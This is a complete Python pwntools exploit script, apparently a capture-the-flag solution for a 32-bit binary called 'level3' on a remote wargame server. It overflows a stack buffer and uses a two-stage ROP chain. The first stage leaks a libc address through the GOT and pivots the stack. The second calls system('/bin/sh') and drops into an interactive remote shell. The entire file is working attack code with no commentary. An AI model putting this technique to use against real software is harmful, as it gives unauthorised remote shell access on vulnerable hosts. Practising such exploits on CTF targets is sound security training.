from pwn import *

#context.log_level = 'debug'

elf = ELF('level3')
libc = ELF('libc-2.19.so')
#libc = ELF('/lib32/libc.so.6')

write = elf.symbols['write']
read = elf.symbols['read']
read_got = elf.got['read']
read_off = libc.symbols['read']
system_off = libc.symbols['system']
#system_off = 0x00040310
binsh_off = next(libc.search('/bin/sh'))

main = 0x08048484
pop_ret = 0x0804851b
pop3_ret = 0x080482ee
leave_ret = 0x080483b8

buf1 = 0x0804b000 - 1000

rop1 = [
	write,
	pop3_ret,
	0x1,
	read_got,
	0x4,
	read,
	pop3_ret,
	0x0,
	buf1,
	0x100,
	pop_ret,
	buf1-4,
	leave_ret
]

#io = process('level3')
#io = remote('127.0.0.1', 4000)
io = remote('pwn2.jarvisoj.com' ,9879)

io.recvuntil('Input:\n')
io.send('a'*140 + flat(rop1))
libc_base = u32(io.recv(4)) - read_off 
print 'libc_base ==> [' + hex(libc_base) + ']'
system = system_off + libc_base
binsh = binsh_off + libc_base

rop2 = [
	system,
	main,
	binsh
]

io.send(flat(rop2))
io.interactive()




